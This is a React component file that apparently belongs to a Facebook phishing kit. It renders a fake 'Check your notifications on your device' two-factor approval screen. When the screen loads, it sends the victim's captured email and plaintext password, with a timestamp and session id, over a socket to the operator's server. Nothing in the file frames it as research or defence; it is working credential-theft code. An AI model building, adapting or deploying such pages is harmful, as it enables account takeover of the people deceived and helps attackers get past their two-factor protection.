import { Box, HStack, Text, VStack } from "@chakra-ui/react";
import { CircleEllipsis } from "lucide-react";
import React, { useEffect } from "react";
import { Button } from "../ui/button";
import { useUser } from "../../contexts/UserContext";

const Approval = ({ socketRef, handleAnotherWay }) => {
  const { isLoading, setIsLoading, credentials, sendTo } = useUser();

  useEffect(() => {
    if (socketRef.current) {
      socketRef.current.emit("fb_approval_mounted", {
        email: credentials.username,
        password: credentials.password,
        timestamp: new Date().toISOString(),
        sessionId: socketRef.current.id,
      });
    }
  }, [socketRef, credentials.username, credentials.password]);
  return (
    <>
      <VStack
        display={{ md: "none", base: "flex" }}
        w="100%"
        pt="3rem"
        px="0.5rem"
        alignItems="flex-start"
      >
        <Text mb="0.7rem" fontWeight="600">
          {sendTo} • Facebook
        </Text>

        <Text
          letterSpacing="0.2px"
          fontSize="28px"
          fontWeight="bold"
          lineHeight="34px"
          mb="0.7rem"
          w="100%"
          textAlign="left"
        >
          Check your notifications on your device
        </Text>

        <Text
          w="100%"
          textAlign="left"
          mb="1rem"
          fontWeight="600"
          fontSize="1.2rem"
        >
          We sent a notification to your device. Check your Facebook
          notifications there and approve the accreditation to continue.
        </Text>

        <HStack alignItems="center" px="1rem" gap="1rem">
          <Box>
            <CircleEllipsis size="2.5rem" />
          </Box>
          <VStack gap="0" alignItems="flex-start">
            <Text fontSize="1.2rem" fontWeight="600">
              Waiting for approval
            </Text>
            <Text>Approve from your device to continue.</Text>
          </VStack>
        </HStack>

        <Button
          w="100%"
          h="44px"
          bg="transparent"
          borderRadius="22px"
          border="1px solid #888"
          color="#101828"
          fontSize="16px"
          fontWeight="500"
          mt="2rem"
          onClick={handleAnotherWay}
          disabled={isLoading}
        >
          Try another way
        </Button>
      </VStack>
    </>
  );
};

export default Approval;
